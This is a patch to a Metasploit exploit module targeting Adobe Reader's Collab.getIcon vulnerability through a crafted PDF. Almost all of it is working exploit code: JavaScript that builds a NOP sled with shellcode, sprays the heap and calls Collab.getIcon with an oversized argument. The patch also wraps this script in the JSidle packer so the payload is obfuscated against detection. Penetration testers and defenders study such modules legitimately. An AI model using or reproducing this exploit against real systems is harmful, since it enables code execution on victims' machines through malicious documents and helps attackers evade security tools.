@@ -1,0 +1,74 @@
+Index: modules/exploits/windows/fileformat/adobe_geticon.rb
+===================================================================
+--- modules/exploits/windows/fileformat/adobe_geticon.rb	(revision 9741)
++++ modules/exploits/windows/fileformat/adobe_geticon.rb	(working copy)
+@@ -11,6 +11,7 @@
+ 
+ require 'msf/core'
+ require 'zlib'
++require 'rex/exploitation/jsidle'
+ 
+ class Metasploit3 < Msf::Exploit::Remote
+ 	Rank = GoodRanking
+@@ -81,40 +82,30 @@
+ 		# Make some nops
+ 		nops    = Rex::Text.to_unescape(make_nops(4))
+ 
+-		# Randomize variables
+-		rand1  = rand_text_alpha(rand(100) + 1)
+-		rand2  = rand_text_alpha(rand(100) + 1)
+-		rand3  = rand_text_alpha(rand(100) + 1)
+-		rand4  = rand_text_alpha(rand(100) + 1)
+-		rand5  = rand_text_alpha(rand(100) + 1)
+-		rand6  = rand_text_alpha(rand(100) + 1)
+-		rand7  = rand_text_alpha(rand(100) + 1)
+-		rand8  = rand_text_alpha(rand(100) + 1)
+-		rand9  = rand_text_alpha(rand(100) + 1)
+-		rand10 = rand_text_alpha(rand(100) + 1)
+-		rand11 = rand_text_alpha(rand(100) + 1)
+-		rand12 = rand_text_alpha(rand(100) + 1)
+-
+ 		script = %Q|
+-		var #{rand1} = unescape("#{shellcode}");
+-		var #{rand2} ="";
+-		for (#{rand3}=128;#{rand3}>=0;--#{rand3}) #{rand2} += unescape("#{nops}");
+-		#{rand4} = #{rand2} + #{rand1};
+-		#{rand5} = unescape("#{nops}");
+-		#{rand6} = 20;
+-		#{rand7} = #{rand6}+#{rand4}.length
+-		while (#{rand5}.length<#{rand7}) #{rand5}+=#{rand5};
+-		#{rand8} = #{rand5}.substring(0, #{rand7});
+-		#{rand9} = #{rand5}.substring(0, #{rand5}.length-#{rand7});
+-		while(#{rand9}.length+#{rand7} < 0x40000) #{rand9} = #{rand9}+#{rand9}+#{rand8};
+-		#{rand10} = new Array();
+-		for (#{rand11}=0;#{rand11}<1450;#{rand11}++) #{rand10}[#{rand11}] = #{rand9} + #{rand4};
+-		var #{rand12} = unescape("%0a");
+-		while(#{rand12}.length < 0x4000) #{rand12}+=#{rand12};
+-		#{rand12} = "N."+#{rand12};
+-		Collab.getIcon(#{rand12});
++		var rand1 = unescape("#{shellcode}");
++		var rand2 ="";
++		for (rand3=128;rand3>=0;--rand3) rand2 += unescape("#{nops}");
++		rand4 = rand2 + rand1;
++		rand5 = unescape("#{nops}");
++		rand6 = 20;
++		rand7 = rand6+rand4.length
++		while (rand5.length<rand7) rand5+=rand5;
++		rand8 = rand5.substring(0, rand7);
++		rand9 = rand5.substring(0, rand5.length-rand7);
++		while(rand9.length+rand7 < 0x40000) rand9 = rand9+rand9+rand8;
++		rand10 = new Array();
++		for (rand11=0;rand11<1450;rand11++) rand10[rand11] = rand9 + rand4;
++		var rand12 = unescape("%0a");
++		while(rand12.length < 0x4000) rand12+=rand12;
++		rand12 = "N."+rand12;
++		Collab.getIcon(rand12);
+ 					|
+ 
++		@packer = Rex::Exploitation::JSidle.new(script, :mode => :pdf)
++		res = @packer.pack()
++		script = res[:js_encoded]
++
+ 		# Create the pdf
+ 		pdf = make_pdf(script)
+ 
